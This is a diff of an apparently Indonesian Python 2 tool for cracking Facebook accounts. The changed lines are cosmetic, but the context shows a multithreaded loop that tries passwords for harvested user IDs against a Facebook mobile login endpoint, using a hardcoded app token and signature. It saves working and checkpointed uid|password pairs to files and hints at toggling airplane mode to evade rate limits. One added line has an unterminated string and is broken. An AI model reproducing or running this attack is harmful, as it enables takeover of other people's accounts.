@@ -31,7 +31,7 @@ def __hasil_ok_cp__():
 	raka("\n \033[0;37m[\033[0;36m1\033[0;36m]\033[0;00m Lihat hasil ok")
 	raka(" \033[0;37m[\033[0;36m2\033[0;36m]\033[0;00m Lihat hasil cp")
 	raka(" \033[0;37m[\033[0;36m3\033[0;36m]\033[0;00m Exit")
-	has = raw_input("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Input : ")
+	has = raw_input("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Input : \033[0;36m")
 	if has == '':
 		exit(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input")
 	elif has == '1':
@@ -87,11 +87,11 @@ def __raka_sayang_amanda__():
 	raka("\n \033[0;37m[\033[0;36m1\033[0;37m]\033[0;00m Login Menggunakan Token Facebook")
 	raka(" \033[0;37m[\033[0;36m2\033[0;37m]\033[0;00m Cara Mengambil Token Facebook")
 	raka(" \033[0;37m[\033[0;36m3\033[0;37m]\033[0;00m Exit")
-        masuk = raw_input("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Input : ")
+        masuk = raw_input("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Input : \033[0;36m")
         if masuk == "":
                 exit(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk Input")
         elif masuk == "1":
-		token = raw_input(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Token : ")
+		token = raw_input(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Token : \033[0;36m")
 		try:
                 	y = requests.get('https://graph.facebook.com/me?access_token='+token)
 	                x = json.loads(y.text)
@@ -158,7 +158,7 @@ def __menu__():
 	print(" \033[0;37m[\033[0;36m2\033[0;37m]\033[0;00m Crack Id Dari Followers")
 	print(" \033[0;37m[\033[0;36m3\033[0;37m]\033[0;00m Chek Results Crack")
 	raka(" \033[0;37m[\033[0;36m0\033[0;37m]\033[0;00m Remove Token")
-	_naruto_kurama_ = raw_input("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Input : ")
+	_naruto_kurama_ = raw_input("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Input : \033[0;36m")
 	if _naruto_kurama_ == "":
 		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input ");exit
 	elif _naruto_kurama_ == "1" or _naruto_kurama_ == "01":
@@ -198,6 +198,7 @@ def __menu__():
 	else:
 		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input");exit
 	raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Total id : \033[0;36m"+str(len(id)))
+	raka(" \n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Mainkan Mode Pesawat 1 Detik ..!))
 	print(' ')
 	def main(arg):
 		global ok,cp,ua, loop
@@ -234,7 +235,7 @@ def __menu__():
 				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
 				send=ses.get(api,params=param, headers=headers_)
 				if "access_token" in send.text and "EAAA" in send.text:
-					print '\r\033[1;92m[Ok] '+uid+'|'+pw+'        '
+					print '\r\033[1;92m[RAKA_AMANDA] '+uid+'|'+pw+'        '
 					ok.append(uid+'|'+pw)
 					save = open('Ok.json','a') 
 					save.write(str(uid)+'|'+str(pw)+'\n')
@@ -243,7 +244,7 @@ def __menu__():
 					continue
 					continue
 				elif "www.facebook.com" in send.json()["error_msg"]:
-					print '\r\033[1;96m[Cp] '+uid+'|'+pw+'|'+nama
+					print '\r\033[1;96m[RAKA_AMANDA] '+uid+'|'+pw+'|'+nama
 					cp.append(uid+'|'+pw)
 					save = open('Cp.json','a')
 					save.write(str(uid)+'|'+str(pw)+'\n')
@@ -255,7 +256,7 @@ def __menu__():
 			pass
 	p = ThreadPool(30)
 	p.map(main, id)
-	raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Cracking Finised ");exit
+	raka(" \n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Cracking Finised ");exit
 
 if __name__=='__main__':
 	os.system('git pull')
